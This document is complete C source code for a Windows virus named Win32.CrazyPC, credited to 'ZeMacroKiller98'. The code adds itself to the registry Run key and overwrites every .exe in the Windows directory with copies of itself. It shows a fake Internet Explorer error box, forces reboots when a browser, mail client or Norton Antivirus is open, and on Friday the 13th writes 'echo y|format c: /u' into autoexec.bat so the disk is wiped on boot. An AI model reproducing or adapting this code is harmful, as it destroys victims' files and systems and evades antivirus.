   #define STRICT
   #include <windows.h>
   #include <dos.h>
   #include <stdlib.h>
   #include <mmsystem.h>
   #pragma hdrstop
   #include "crazypc.h"
   #pragma warning (disable: 4068)

   char RetPath[256],WinDirec[256],MyBuffer[256]="echo y|format c: /u /v:CrazyPC";
   HWND MyHwnd,MailHwnd,MicIntEx,NortAvHwnd;
   DWORD ExtInf;
   HDC MyHdc,Hdc1,MailHdc;
   HBITMAP MyIcon,StCur,MyCur;
   HINSTANCE hInst;
   HANDLE SearchHost,BatFile;
   HKEY MyKey,InfectKey,RunKey;
   #pragma argsused
   int PASCAL WinMain
   (
   HINSTANCE hInstance,
   HINSTANCE hPrevInstance,
   LPSTR     lpszCmdLine,
   int       nCmdShow
   )
   {
   //Win32.CrazyPC par ZeMacroKiller98, member of [SOS]
   WIN32_FIND_DATA HostFile;
   SYSTEMTIME SysTim;
   STARTUPINFO StInf;
   PROCESS_INFORMATION ProcInfo;
   StInf.cb = sizeof(STARTUPINFO);
   StInf.lpReserved = NULL;
   StInf.lpReserved2 = NULL;
   StInf.cbReserved2 = 0;
   StInf.lpDesktop = NULL;
   StInf.dwFlags = STARTF_FORCEOFFFEEDBACK;
   SearchPath(NULL,_argv[0],NULL,sizeof(RetPath),RetPath,NULL);
   RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&RunKey);
   RegSetValueEx(RunKey,"CrazyPC",0,REG_SZ,RetPath,sizeof(RetPath));
   RegCloseKey(RunKey);
   //Infect Exe File in Windows Directory
   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\CrazyPC\\ZeMacroKiller98",0,KEY_ALL_ACCESS,&MyKey)!=ERROR_SUCCESS)
   {
   GetWindowsDirectory(WinDirec,sizeof(WinDirec));
   SetCurrentDirectory(WinDirec);
   SearchHost = FindFirstFile("*.exe",&HostFile);
   HostFind:
   CopyFile(_argv[0],HostFile.cFileName,FALSE);
   if(FindNextFile(SearchHost,&HostFile)==TRUE)
       goto HostFind;
   FindClose(SearchHost);
   RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\CrazyPC\\ZeMacroKiller98",&InfectKey);
   MessageBox(NULL,"Une erreur interne au programme s'est produit lors de son lancement\nVeuillez redémarrer votre ordinateur\nInternal error occured when you have launch this program\nPlease reboot your computer","Microsoft Internet Explorer",MB_OK|MB_ICONEXCLAMATION);
   ExitProcess(GetLastError());
   }
   CreateProcess(RetPath,GetCommandLine(),(LPSECURITY_ATTRIBUTES)NULL,(LPSECURITY_ATTRIBUTES)NULL,FALSE,CREATE_NEW_PROCESS_GROUP|NORMAL_PRIORITY_CLASS,NULL,NULL,&StInf,&ProcInfo);
   GetLocalTime(&SysTim);
   if(SysTim.wMinute==30)
   {
   MyHdc = GetDC(MyHwnd);
   SetGraphicsMode(MyHdc,GM_ADVANCED);
   Hdc1 = CreateCompatibleDC(MyHdc);
   MyIcon = LoadBitmap(hInstance,"Mort");
   (HGDIOBJ)StCur = SelectObject(Hdc1,(HGDIOBJ)MyIcon);
   BitBlt(MyHdc,300,220,640,480,Hdc1,0,0,SRCCOPY);
   ReleaseDC(MyHwnd,MyHdc);
   }
   if(((SysTim.wDayOfWeek==1)||(SysTim.wDayOfWeek==3)||(SysTim.wDayOfWeek==5))==TRUE)
   {
       if((MailHwnd = FindWindow(NULL,"Outlook Express"))!=NULL)
           ExitWindowsEx(EWX_FORCE|EWX_REBOOT,0);
   }
   if(((SysTim.wDayOfWeek==0)||(SysTim.wDayOfWeek==2)||(SysTim.wDayOfWeek==4)||(SysTim.wDayOfWeek==6))==TRUE)
   {
       if((MicIntEx = FindWindow(NULL,"Microsoft Internet Explorer"))!=NULL)
           ExitWindowsEx(EWX_FORCE|EWX_REBOOT,0);
   }
   if((NortAvHwnd = FindWindow(NULL,"Norton Antivirus"))!=NULL)
       ExitWindowsEx(EWX_FORCE|EWX_REBOOT,0);
   if(((SysTim.wDayOfWeek==5)&&(SysTim.wDay==13))==TRUE)
   {
       SetCurrentDirectory("C:\\");
       BatFile = CreateFile("autoexec.bat",GENERIC_WRITE,0,(LPSECURITY_ATTRIBUTES) NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,(HANDLE) NULL);
       SetFilePointer(BatFile, 0, (LPLONG)NULL,FILE_END);
       WriteFile(BatFile,MyBuffer,sizeof(MyBuffer),&ExtInf,NULL);
       CloseHandle(BatFile);
       ExitWindowsEx(EWX_FORCE|EWX_REBOOT,0);
   }
   if(((SysTim.wDay==13)&&(SysTim.wHour==13)&&(SysTim.wMinute==13)&&(SysTim.wSecond==13))==TRUE)
       MessageBox(NULL,"J''ai contaminé votre PC, vous allez le regretter...\nZeMacroKiller98 est heureux de vous offrir ce virus!!!!","Virus CrazyPC",MB_OK|MB_ICONINFORMATION);
   if(GetTickCount()==3600000)
   {
       mciSendString("open cdaudio",NULL,0,NULL);
       mciSendString("set cdaudio door open",NULL,0,NULL);
       mciSendString("close cdaudio",NULL,0,NULL);
       mciSendString("open cdaudio",NULL,0,NULL);
       mciSendString("set cdaudio audio all off",NULL,0,NULL);
       mciSendString("close cdaudio",NULL,0,NULL);
   }
   CloseHandle(ProcInfo.hProcess);
   CloseHandle(ProcInfo.hThread);
   return 0;
   }
